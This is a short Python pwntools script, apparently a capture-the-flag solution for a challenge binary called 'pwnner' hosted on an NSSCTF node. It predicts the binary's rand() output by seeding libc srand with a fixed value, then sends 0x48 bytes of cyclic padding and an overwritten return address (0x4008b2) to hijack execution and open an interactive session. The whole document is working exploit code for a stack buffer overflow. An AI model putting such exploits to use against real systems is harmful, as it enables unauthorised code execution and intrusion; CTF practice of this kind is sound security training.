from pwn import *
from ctypes import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


# io=process("./pwnner")
io=remote("node5.anna.nssctf.cn",28470)
cs=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

cs.srand(0x39)
io.recvuntil(b"name:\n")
payload=cs.rand()
io.send(str(payload))
io.recvuntil(b"next?\n")
payload=cyclic(0x48)+p64(0x4008b2)
io.sendline(payload)

io.interactive()